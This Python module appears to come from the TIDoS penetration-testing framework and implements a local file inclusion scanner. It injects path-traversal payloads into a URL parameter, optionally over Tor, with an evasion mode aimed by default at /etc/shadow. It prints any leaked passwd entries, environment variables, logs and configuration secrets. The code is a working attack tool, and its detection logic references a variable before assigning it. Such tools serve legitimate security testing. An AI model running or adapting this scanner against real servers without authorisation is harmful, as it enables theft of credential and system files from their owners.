#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#Author: @_tID
#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import os
import sys
import requests as wrn
import time
sys.path.append('files/signaturedb/')
from re import search
from core.methods.tor import session
from multiprocessing import Pool, TimeoutError
from core.variables import processes
from core.methods.multiproc import listsplit
from core.Core.colors import *
from files.signaturedb.lfierror_signatures import errorsig
from random import choice
from string import ascii_uppercase, ascii_lowercase
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

wrn.packages.urllib3.disable_warnings(InsecureRequestWarning)
payloads = []
ev = [""]

info = "This module checks the presence of local file inclusion vulnerabilities."
searchinfo = "Local File Inclusion Scanner"
properties = {"PARAM":["Directory and Parameter to attack (eg /vuln/page.php?q=lmao)", " "], "PARALLEL":["Parallelise Attack? [1/0]", " "], "EVASION":["Try to evade sanitisations (specific file lookup) [1/0]", " "], "FILE":["File to be searched by EVASION (default: /etc/shadow)", " "], "DICT":["Path to dictionary to be used in normal attacks (default: files/fuzz-db/lfi_paths.lst)", " "]}

def check0x00(web0x00, pay, gen_headers):
    gotcha = []
    loggy = []
    enviro = []
    fud = []
    generic = []
    cnfy = []
    requests = session()
    try:
        hunt = 0x00
        print(GR+' [*] Making the request...')
        rq = requests.get(web0x00, headers=gen_headers, allow_redirects=False, verify=False, timeout=7)
        c = rq.content
        content = str(rq.content)
        print(O+' [!] Analysing responses...')
        time.sleep(0.7)

        if rq.status_code == 200 or str(rq.status_code).startswith('2'):
            # signatures forked from lfisuite
            if ("[<a href='function.main'>function.main</a>" not in content
                    and "[<a href='function.include'>function.include</a>" not in content
                    and ("Failed opening" not in content and "for inclusion" not in content)
                    and "failed to open stream:" not in content
                    and "open_basedir restriction in effect" not in content
                    and ("root:" in content or ("sbin" in content and "nologin" in content)
                or "DB_NAME" in content or "daemon:" in content or "DOCUMENT_ROOT=" in content or 'root:x:' in content
                or "PATH=" in content or "HTTP_ACCEPT_ENCODING=" in content or "HTTP_USER_AGENT" in content
                or "users:x" in content or ("GET /" in content and ("HTTP/1.1" in content or "HTTP/1.0" in content))
                or "apache_port=" in content or "cpanel/logs/access" in content or "allow_login_autocomplete" in content
                or "database_prefix=" in content or "emailusersbandwidth" in content or "adminuser=" in content
                or 'daemon:x:' in content or 'bin:x:' in content or 'mail:x:' in content or 'user:x:' in content
                or ("error]" in content and "[client" in content and "log" in website)
                or ("[error] [client" in content and "File does not exist:" in content and "proc/self/fd/" in website)
                or ("State: R (running)" in content and ("Tgid:" in content or "TracerPid:" in content or "Uid:" in content)
                    and "/proc/self/status" in website))):

                website = str(web0x00)
                print(G+" [+] "+O+web0x00+G+' seems Vulnerable!')
                print(W+color.BOLD+' [+] Content Received : ')
                print(W+content)

                gotcha.append(website)

                if("log" in website):
                    loggy.append(website)
                elif("/proc/self/environ" in website):
                    enviro.append(website)
                elif("/proc/self/fd" in website):
                    fud.append(website)
                elif(".cnf" in website or ".conf" in website or ".ini" in website):
                    cnfy.append(website)
                else:
                    generic.append(website)
            else:
                website = str(web0x00)
                print(R+" [-] "+str(website)+O+" does not seem vulnerable...")
                if len(rq.content) > 0:
                    print(W+color.BOLD+' [+] Content Received : ')
                    print(W+content)
        elif str(rq.status_code).startswith('3'):
            print(R+" [-] Redirection Response Received..."+O+' ('+str(rq.status_code)+')')
            if len(rq.content) > 0:
                print(W+color.BOLD+' [+] Content Received : ')
                print(W+content)
        else:
            print(R+" [-] Response Received : "+O+str(rq.status_code))
            if len(rq.content) > 0:
                print(W+color.BOLD+' [+] Content Received : ')
                print(W+content)

    except Exception as e:
        print(R+' [-] Exception encountered!')
        print(R+' [-] Error : '+str(e))
        
    return (gotcha, generic, loggy, enviro, fud, cnfy)


def outto0x00(toPrint,stack):
    print(" [+] %s: [%s]" %(toPrint,len(stack)))
    print('')
    print(O+' [*] Displaying paths obtained...\n')
    for path in stack:
        print(G+' [+] Path :> ' + str(path))
    print("")

def getFile0x00():

    try:
        if properties["EVASION"][1] == " ":
            ev[0] = input(O+"\n [?] Perform Evasion Attack? (specific file ; enter for no) :> ")
        elif properties["EVASION"][1] == "0":
            ev[0] = ""
        else:
            ev[0] = "1"
        evasion = ev[0] != ""
        if not evasion:
            print(GR+' [*] Importing filepath...')
            if properties["DICT"][1] == " ":
                print(O+' [§] Enter path to file (default: files/fuzz-db/lfi_paths.lst)...')
                w = input(O+' [§] Your input (Press Enter if default) :> '+C)
            elif properties["DICT"][1].lower() == "none":
                w = ""
            else:
                w = properties["DICT"][1]
            if w == '':
                fi = 'files/fuzz-db/lfi_paths.lst'
                print(GR+' [*] Importing payloads...')
                with open(fi,'r') as q0:
                    for q in q0:
                        q = q.strip("\n")
                        payloads.append(q)
            else:
                fi = w
                if os.path.exists(fi) == True:
                    print(G+' [+] File '+fi+' found...')
                    print(GR+' [*] Importing payloads...')
                    with open(fi,'r') as q0:
                        for q in q0:
                            q = q.strip("\n")
                            payloads.append(q)
        else:
            fi = 'files/fuzz-db/pathtrav_evasion.lst'
            with open(fi,'r') as q0:
                for q in q0:
                    q = q.strip("\n")
                    payloads.append(q)
    except IOError:
        print(R+' [-] File path '+O+fi+R+' not found!')

def chkpre(evasion, filepath, payloads, web00, bug2, gen_headers):
    gotcha = []
    generic = []
    loggy = []
    enviro = []
    fud = []
    cnfy = []
    for pay in payloads:
        if evasion and filepath != "":
            pay = pay.replace("etc/shadow", filepath)
        print(GR+'\n [*] Setting parameters...')
        web0x00 = web00 + pay + bug2
        print(C+' [+] Using path : '+B+str(pay))
        print(B+' [+] Url : '+GR+str(web0x00))
        paths = check0x00(web0x00, pay, gen_headers)
        gotcha += paths[0]
        generic += paths[1]
        loggy += paths[2]
        enviro += paths[3]
        fud += paths[4]
        cnfy += paths[5]
    return (gotcha, generic, loggy, enviro, fud, cnfy)

def atck(evasion, filepath, payloads, web00, bug2, parallel, gen_headers):
    gotcha = []
    loggy = []
    enviro = []
    fud = []
    generic = []
    cnfy = []
    if not parallel:
        for pay in payloads:
            if evasion and filepath != "":
                pay = pay.replace("etc/shadow", filepath)
            print(GR+'\n [*] Setting parameters...')
            web0x00 = web00 + pay + bug2
            print(C+' [+] Using path : '+B+str(pay))
            print(B+' [+] Url : '+GR+str(web0x00))
            paths = check0x00(web0x00, pay, gen_headers)
            gotcha += paths[0]
            generic += paths[1]
            loggy += paths[2]
            enviro += paths[3]
            fud += paths[4]
            cnfy += paths[5]
    else:
        print(round(len(payloads)/processes))
        paylists = listsplit(payloads, round(len(payloads)/processes))
        with Pool(processes=processes) as pool:
            res = [pool.apply_async(chkpre, args=(evasion,filepath,l,web00,bug2,gen_headers,)) for l in paylists]
            #res1 = pool.apply_async(portloop, )
            for i in res:
                paths = i.get()
                gotcha += paths[0]
                generic += paths[1]
                loggy += paths[2]
                enviro += paths[3]
                fud += paths[4]
                cnfy += paths[5]
    if gotcha:
        data = "Paths leaked!\n" + str(gotcha)
        save_data(database, module, lvl1, lvl2, lvl3, name, data)
        print(G+"\n [+] Retrieved %s interesting paths...\n" % str(len(gotcha)))
        time.sleep(0.5)

        outto0x00("Logs",loggy)
        outto0x00("/proc/self/environ",enviro)
        outto0x00("/proc/self/fd",fud)
        outto0x00("Configuration", cnfy)
        outto0x00("Generic",generic)

    else:
        print(R+' [-] No vulnerable paths found!')
        save_data(database, module, lvl1, lvl2, lvl3, name, "No vulnerable paths found.")

def lfi(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Critical Vulnerabilities"
    global lvl3
    lvl3 = ""
    ev[0] = ""
    payloads.clear()
    time.sleep(0.5)
    #print(R+'\n     =========================================')
    #print(R+'\n      L O C A L   F I L E   I N C L U S I O N')
    #print(R+'     ---<>----<>----<>----<>----<>----<>----<>\n')

    from core.methods.print import pvln
    pvln("local file inclusion") 
                  

    print(GR+' [*] Initiating '+R+'Parameter Based Check...')
    if properties["PARAM"][1] == " ":
        param = input(O+' [§] Parameter Path (eg. /vuln/fetch.php?q=lmao) :> ')
    else:
        param = properties["PARAM"][1]
    if not param.startswith('/'):
        param = '/' + param
    choice = ""
    if "&" in param:
        ln = len(param.split("&"))
        choice = input(" [!] Discovered {} parameters. Which one to use? (enter name) :> ".format(ln))
        if not choice in param:
            sys.exit(" [-] Param {} not found.".format(choice))

    bug2 = ""
    if choice != "":
        n = param.split(choice + "=")[1]
        if "&" in n:
            bug2 = param.split(choice)[1]
            tmp = bug2.split("&")[0]
            bug2 = bug2.replace(tmp,"")
    if properties["PARALLEL"][1] == " ":
        pa = input("\n [?] Parallelise Attack? (enter if not) :> ")
        parallel = pa != ""
    else:
        parallel = properties["PARALLEL"][1] == "1"
    getFile0x00()
    print(GR+' [*] Setting headers...')
    gen_headers =    {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
                      'Accept-Language':'en-US;',
                      'Accept-Encoding': 'gzip, deflate',
                      'Accept': 'text/php,application/xhtml+xml,application/xml;',
                      'Connection':'close'}

    print(O+' [!] Parsing Url...')
    time.sleep(0.7)
    web00 = web + param.split(choice + '=')[0] + choice + '='
    try:
        evasion = ev[0] != ""
        filepath = ""
        if evasion:
            if properties["FILE"][1] == " ":
                filepath = input(" [!] Enter file and path to search (Default: etc/shadow) :> ")
            elif properties["FILE"][1].lower() == "none":
                filepath = ""
            else:
                filepath = properties["FILE"][1]
        
        atck(evasion, filepath, payloads, web00, bug2, parallel, gen_headers)

    except Exception as e:
        print(R+' [-] Unexpected Exception Encountered!')
        print(R+' [-] Exception : '+str(e))

    print(G+'\n [+] LFi Module Completed!')

def attack(web):
    web = web.fullurl
    lfi(web)
